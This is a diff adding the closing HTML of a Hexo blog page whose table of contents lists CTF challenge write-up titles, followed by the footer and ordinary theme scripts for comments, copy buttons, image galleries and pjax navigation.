class="toc-link" href="#Jiang%E2%80%98s-Secret"><span class="toc-text">Jiang‘s Secret</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Hardsql"><span class="toc-text">Hardsql</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%A0%E6%9C%89%E7%89%B9%E6%B4%9B%E4%BC%8A%E4%B9%88"><span class="toc-text">你有特洛伊么</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Leixiao%E2%80%99s-blog"><span class="toc-text">Leixiao’s blog</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%961-0"><span class="toc-text">反序列化1.0</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%88%E6%9D%A5%E4%B8%80%E5%8F%AA%E7%8C%AB"><span class="toc-text">又来一只猫</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%A0%E6%9C%89%E5%88%9D%E6%81%8B%E5%90%97"><span class="toc-text">你有初恋吗</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%EF%AC%81nalsql"><span class="toc-text">ﬁnalsql</span></a></li></ol>
+    </div>
+  </section>
+
+
+  
+
+
+</aside>
+
+
+
+    </div>
+    
+  
+  <footer class="clearfix">
+    <br><br>
+    
+      
+        <br>
+        <div class="social-wrapper">
+          
+            
+              <a href="/atom.xml"
+                class="social fas fa-rss flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+              </a>
+            
+          
+            
+              <a href="mailto:3300162791@qq.com"
+                class="social fas fa-envelope flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+              </a>
+            
+          
+            
+              <a href="https://github.com/BeyondOneself"
+                class="social fab fa-github flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+              </a>
+            
+          
+            
+          
+        </div>
+      
+    
+      
+        <div><p>博客内容遵循 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</a></p>
+</div>
+      
+    
+      
+        本站使用
+        <a href="https://github.com/volantis-x/hexo-theme-volantis/releases/tag/3.0.0" target="_blank" class="codename">Volantis</a>
+        作为主题，总访问量为
+          <span id="busuanzi_value_site_pv"><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span>
+          次
+        
+      
+    
+      
+        <div class='copyright'>
+        <p><a href="/">Copyright © 2019-2020</a></p>
+
+        </div>
+      
+    
+  </footer>
+
+
+    <a class="s-top fas fa-arrow-up fa-fw" href='javascript:void(0)'></a>
+  </div>
+  <div>
+    
+    
+<script src="/static/js-css/jquery.min.js"></script>
+
+
+
+  <script>
+    
+    var SEARCH_SERVICE = "hexo" || "hexo";
+    var ROOT = "/" || "/";
+    if (!ROOT.endsWith('/')) ROOT += '/';
+  </script>
+
+
+
+  <script async src="/static/js-css/instant_page.js" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
+
+
+
+  
+  
+  
+    
+<script src="/static/js-css/jquery.backstretch.min.js"></script>
+
+    <script type="text/javascript">
+      $(function(){
+        var imgs=["/static/images/1.jpg", "/static/images/2.jpg", "/static/images/3.jpg", "/static/images/4.jpg", "/static/images/5.jpg", "/static/images/6.jpg", "/static/images/7.jpg", "/static/images/8.jpg", "/static/images/9.jpg", "/static/images/10.jpg", "/static/images/11.jpg", "/static/images/12.jpg", "/static/images/13.jpg", "/static/images/14.jpg", "/static/images/15.jpg", "/static/images/16.jpg", "/static/images/17.jpg", "/static/images/18.jpg", "/static/images/19.jpg", "/static/images/20.jpg", "/static/images/21.jpg", "/static/images/22.jpg", "/static/images/23.jpg", "/static/images/24.jpg", "/static/images/25.jpg", "/static/images/26.jpg", "/static/images/27.jpg", "/static/images/28.jpg", "/static/images/29.jpg", "/static/images/30.jpg", "/static/images/31.jpg", "/static/images/32.jpg", "/static/images/33.jpg", "/static/images/34.jpg", "/static/images/35.jpg", "/static/images/36.jpg", "/static/images/37.jpg", "/static/images/38.jpg", "/static/images/39.jpg", "/static/images/40.jpg", "/static/images/41.jpg", "/static/images/42.jpg", "/static/images/43.jpg", "/static/images/44.jpg", "/static/images/45.jpg", "/static/images/46.jpg", "/static/images/47.jpg", "/static/images/48.jpg", "/static/images/49.jpg", "/static/images/50.jpg", "/static/images/51.jpg", "/static/images/52.jpg", "/static/images/53.jpg", "/static/images/54.jpg", "/static/images/55.jpg", "/static/images/56.jpg", "https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/abstract/41F215B9-261F-48B4-80B5-4E86E165259E.jpeg"];
+        if ('true' == 'true') {
+          function shuffle(arr){
+            /*From countercurrent-time*/
+            var n = arr.length;
+            while(n--) {
+              var index = Math.floor(Math.random() * n);
+              var temp = arr[index];
+              arr[index] = arr[n];
+              arr[n] = temp;
+            }
+          }
+          shuffle(imgs);
+        }
+        if ('.cover') {
+          $('.cover').backstretch(
+            imgs,
+          {
+            duration: "20000",
+            fade: "1500"
+          });
+        } else {
+          $.backstretch(
+            imgs,
+          {
+            duration: "20000",
+            fade: "1500"
+          });
+        }
+      });
+    </script>
+  
+
+
+
+
+
+
+  
+  
+<script src="/js/valine.js"></script>
+
+
+<script>
+  var GUEST_INFO = ['nick', 'mail', 'link'];
+  var meta = 'nick,mail,link'.split(',').filter(function (item) {
+    return GUEST_INFO.indexOf(item) > -1
+  });
+  var REQUIRED_FIELDS = ['nick', 'mail', 'link'];
+  var requiredFields = 'nick,mail'.split(',').filter(function (item) {
+    return REQUIRED_FIELDS.indexOf(item) > -1
+  });
+
+  function emoji(path, idx, ext) {
+    return path + "/" + path + "-" + idx + "." + ext;
+  }
+
+  var emojiMaps = {};
+  for (var i = 1; i <= 54; i++) {
+    emojiMaps['tieba-' + i] = emoji('tieba', i, 'png');
+  }
+  for (var i = 1; i <= 101; i++) {
+    emojiMaps['qq-' + i] = emoji('qq', i, 'gif');
+  }
+  for (var i = 1; i <= 116; i++) {
+    emojiMaps['aru-' + i] = emoji('aru', i, 'gif');
+  }
+  for (var i = 1; i <= 125; i++) {
+    emojiMaps['twemoji-' + i] = emoji('twemoji', i, 'png');
+  }
+  for (var i = 1; i <= 4; i++) {
+    emojiMaps['weibo-' + i] = emoji('weibo', i, 'png');
+  }
+
+  function pjax_valine() {
+    let pageUrl = $.trim($('#pjax-comment-path').text()) === "none" ? 
+      decodeURI(window.location.pathname) : $.trim($('#pjax-comment-path').text());
+    let pagePlaceholder = $.trim($('#pjax-comment-placeholder').text()) === "none" ?
+      "快来评论吧~" : $.trim($('#pjax-comment-placeholder').text());
+
+    let ALLPATH = '';
+    if(ALLPATH != '') pageUrl = ALLPATH;
+
+    var valine = new Valine();
+    valine.init({
+      el: '#valine_container',
+      meta: meta,
+      placeholder: pagePlaceholder,
+      path: pageUrl,
+      appId: "or2NepulP8NGKXehq1IRSQTc-gzGzoHsz",
+      appKey: "lRlc11XLlqK4AeDJeNJxo17y",
+      pageSize: '10',
+      avatar: 'robohash',
+      lang: 'zh-cn',
+      visitor: 'true',
+      highlight: 'true',
+      mathJax: 'false',
+      enableQQ: 'true',
+      requiredFields: requiredFields,
+      emojiCDN: 'https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/valine/',
+      emojiMaps: emojiMaps
+    })
+  }
+
+  $(function () {
+    pjax_valine();
+  });
+</script>
+
+
+
+
+<!-- darkmodejs -->
+
+
+<!-- 复制 -->
+
+  <script src="/static/js-css/clipboard.min.js"></script>
+<script>
+    var clipboard = new ClipboardJS('.btn-copy', {
+        target: function (trigger) {
+            return trigger.nextElementSibling
+        }
+    });
+    function wait(callback, seconds) {
+        var timelag = null;
+        timelag = window.setTimeout(callback, seconds)
+    }
+    function pjax_initCopyCode() {
+        var copyHtml = '';
+        copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+        copyHtml += '<i class="fas fa-copy"></i><span>COPY</span>';
+        copyHtml += '</button>';
+        $(".highlight .code pre").before(copyHtml);
+        $(".article pre code").before(copyHtml);
+        clipboard.off('success').on('success', function (e) {
+            let $btn = $(e.trigger);
+            $btn.addClass('copied');
+            let $icon = $($btn.find('i'));
+            $icon.removeClass('fa-copy');
+            $icon.addClass('fa-check-circle');
+            let $span = $($btn.find('span'));
+            $span[0].innerText = 'COPIED';
+            wait(function () {
+                $icon.removeClass('fa-check-circle');
+                $icon.addClass('fa-copy');
+                $span[0].innerText = 'COPY'
+            }, 2000)
+        });
+        clipboard.off('error').on('error', function (e) {
+            e.clearSelection();
+            let $btn = $(e.trigger);
+            $btn.addClass('copy-failed');
+            let $icon = $($btn.find('i'));
+            $icon.removeClass('fa-copy');
+            $icon.addClass('fa-times-circle');
+            let $span = $($btn.find('span'));
+            $span[0].innerText = 'COPY FAILED';
+            wait(function () {
+                $icon.removeClass('fa-times-circle');
+                $icon.addClass('fa-copy');
+                $span[0].innerText = 'COPY'
+            }, 2000)
+        })
+    }
+    $(function () {
+        pjax_initCopyCode()
+    });
+</script>
+
+
+<!-- scrollreveal -->
+
+  <script src="/static/js-css/scrollreveal.min.js"></script>
+  <script type="text/javascript">
+    function pjax_scrollrebeal() {
+      ScrollReveal().reveal('.l_main .reveal', {
+        distance: '32px',
+        duration: '800',
+        interval: '20',
+        scale: '1',
+        easing: 'ease-out'
+      });
+    }
+
+    $(function () {
+      pjax_scrollrebeal();
+    });
+  </script>
+
+<!-- ******************************** -->
+
+<!-- fancybox -->
+<script src="/static/js-css/jquery.fancybox.min.js"></script>
+<script>
+  function pjax_fancybox() {
+    $(".article-entry").find("img").not('.inline').not('a img').each(function () { //渲染 fancybox
+      var element = document.createElement("a"); // a 标签
+      $(element).attr("class", "fancybox");
+      $(element).attr("pjax-fancybox", "");  // 过滤 pjax
+      $(element).attr("href", $(this).attr("src"));
+      if ($(this).attr("data-original")) {
+        $(element).attr("href", $(this).attr("data-original"));
+      }
+      $(element).attr("data-fancybox", "images");
+      var caption = "";   // 描述信息
+      if ($(this).attr('alt')) {  // 判断当前页面是否存在描述信息
+        $(element).attr('data-caption', $(this).attr('alt'));
+        caption = $(this).attr('alt');
+      }
+      var div = document.createElement("div");
+      $(div).addClass("fancybox");
+      $(this).wrap(div); // 最外层套 div ，其实主要作用还是 class 样式
+      var span = document.createElement("span");
+      $(span).addClass("image-caption");
+      $(span).text(caption); // 加描述
+      $(this).after(span);  // 再套一层描述
+      $(this).wrap(element);  // 最后套 a 标签
+    })
+    $(".article-entry").find("img").fancybox({
+      selector: '[data-fancybox="images"]',
+      hash: false,
+      loop: false,
+      closeClick: true,
+      helpers: {
+        overlay: {closeClick: true}
+      },
+      buttons: [
+        "zoom",
+        "close"
+      ]
+    });
+  };
+  $(function () {
+    pjax_fancybox();
+  });
+</script>
+
+<!-- ******************************** -->
+
+
+  
+<script src="/js/app.js"></script>
+
+
+
+
+  
+    
+<script src="/js/search.js"></script>
+
+  
+
+
+
+  <script defer src="/static/js-css/busuanzi.pure.mini.js" data-pjax></script>
+
+
+
+  
+<script src="/static/js-css/waves.min.js"></script>
+
+  <script type="text/javascript">
+    $(function () {
+      Waves.attach('.flat-btn', ['waves-button']);
+      Waves.attach('.float-btn', ['waves-button', 'waves-float']);
+      Waves.attach('.float-btn-light', ['waves-button', 'waves-float', 'waves-light']);
+      Waves.attach('.flat-box', ['waves-block']);
+      Waves.attach('.float-box', ['waves-block', 'waves-float']);
+      Waves.attach('.waves-image');
+      Waves.init();
+    });
+  </script>
+
+
+
+  
+<script src="/static/js-css/comment_typing.js"></script>
+
+
+
+
+
+
+
+    
+      
+
+
+<script src="/static/js-css/pjax.min.js"></script>
+
+<!-- 样式位于：source/css/_third-party/pjaxanimate.styl -->
+
+<div class="pjax-animate">
+  
+    <script src="/static/js-css/nprogress.min.js"></script>
+    <div id="loading-bar-wrapper"><script>NProgress.configure({parent:"#loading-bar-wrapper",trickleSpeed: 100})</script></div>
+    <script>
+      window.ShowLoading = function() {
+        NProgress.start();
+      };
+      window.HideLoading = function() {
+        NProgress.done();
+      }
+    </script>
+  
+</div>
+
+<script>
+    var pjax;
+    document.addEventListener('DOMContentLoaded', function () {
+      pjax = new Pjax({
+        elements: 'a[href]:not([href^="#"]):not([href="javascript:void(0)"]):not([pjax-fancybox])',
+        selectors: [
+          "title",
+          "#pjax-container",
+          "#pjax-header-nav-list"
+        ],
+        cacheBust: false,   // url 地址追加时间戳，用以避免浏览器缓存
+        timeout: 5000
+      });
+    });
+
+    document.addEventListener('pjax:send', function (e) {
+      window.stop(); // 相当于点击了浏览器的停止按钮
+
+      try {
+        var currentUrl = window.location.pathname;
+        var targetUrl = e.triggerElement.href;
+        var banUrl = [""];
+        if (banUrl[0] != "") {
+          banUrl.forEach(item => {
+            if(currentUrl.indexOf(item) != -1 || targetUrl.indexOf(item) != -1) {
+              window.location.href = targetUrl;
+            }
+          });
+        }
+      } catch (error) {}
+
+      window.subData = null; // 移除标题（用于一二级导航栏切换处）
+      $.fancybox.close();    // 关闭弹窗
+      $('.l_header .switcher .s-search').removeClass('active'); // 关闭移动端激活的搜索框
+      $('.l_header').removeClass('z_search-open'); // 关闭移动端激活的搜索框
+      $('.wrapper').removeClass('sub'); // 跳转页面时关闭二级导航
+
+      // 解绑事件 避免重复监听
+      $('.s-top').unbind('click');
+      $('.menu a').unbind('click');
+      $(window).unbind('resize');
+      $(window).unbind('scroll');
+      $(document).unbind('scroll');
+      $(document).unbind('click');
+      $('body').unbind('click');
+      window.ShowLoading();
+    });
+
+    document.addEventListener('pjax:complete', function () {
+      // 关于百度统计对 SPA 页面的处理：
+      // 方案一：百度统计>管理>单页应用设置中，打开开启按钮即可对SPA进行统计。 https://tongji.baidu.com/web/help/article?id=324
+      // 方案二：取消注释下列代码。 https://tongji.baidu.com/web/help/article?id=235
+      // 
+
+      // 关于谷歌统计对 SPA 页面的处理：
+      // 当应用以动态方式加载内容并更新地址栏中的网址时，也应该更新通过 gtag.js 存储的网页网址。
+      // https://developers.google.cn/analytics/devguides/collection/gtagjs/single-page-applications?hl=zh-cn
+      
+
+      $('.nav-main').find('.list-v').not('.menu-phone').removeAttr("style",""); // 移除小尾巴的移除
+      $('.menu-phone.list-v').removeAttr("style",""); // 移除小尾巴的移除
+      $('script[data-pjax], .pjax-reload script').each(function () {
+        $(this).parent().append($(this).remove());
+      });
+
+      try{
+        pjax_fancybox();
+        
+          
+          if ('.cover') {
+            $('.cover').backstretch("resize");
+          } else {
+            $.backstretch("resize");
+          }
+        
+        
+        
+          pjax_scrollrebeal();
+        
+        
+          pjax_initCopyCode();
+        
+        
+          pjax_valine();
+        
+        
+        
+        
+        
+      } catch (e) {
+        console.log(e);
+      }
+      window.HideLoading();
+    });
+
+    document.addEventListener('pjax:error', function (e) {
+      window.HideLoading();
+      window.location.href = e.triggerElement.href;
+    });
+</script>
+
+    
+  </div>
+</body>
+</html>
